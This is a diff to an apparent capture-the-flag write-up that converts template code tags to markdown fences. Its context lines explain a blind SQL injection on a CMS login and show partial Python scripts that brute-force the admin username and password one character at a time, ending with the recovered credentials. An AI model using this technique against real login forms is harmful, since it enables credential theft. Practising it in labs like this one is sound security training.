@@ -69,7 +69,7 @@ from admins # #The username field is in the admins table end the '#' comments ou
 ```
 So remember how we set the password to `hello` while solving Flag 1? Here we are basically doing the same, setting the password to `right` or `wrong` based on the result of the query `select substring(username,1,1)='a'`. Obviously we have to run multiple queries and everytime increment the checked substring size. So let's automate this! I Wrote the following python code.
 For the username:
-{% highlight python %}
+```python
 import requests
 import string
 url="http://34.94.3.143/9e734fe631/login"
@@ -94,13 +94,13 @@ while True:
             c+=1
             print(username)
             break
-{% endhighlight %}
+```
 
 By running the above code, It takes about 30 seconds to split out the entire username. Note that the program won't stop automatically so we have to escape with `CTRL+C`:
 ![Getting Username](/assets/GettingUsername_CMS.png)
 
 For the password the code looks very similar:
-{% highlight python %}
+```python
 import requests
 import string
 url="http://34.94.3.143/9e734fe631/login"
@@ -125,7 +125,7 @@ while True:
             c+=1
             print(password)
             break
-{% endhighlight %}
+```
 
 Note that here I added `where username='charity'` to the query to be sure that we get the password of the previously found user. However this isn't strictly neccessary because it seems that the admin user is only one. At the end the credentials where `username:charity` and `password:keira`.
 By Logging in with the above credentials we immidiatly get the flag on screen! 
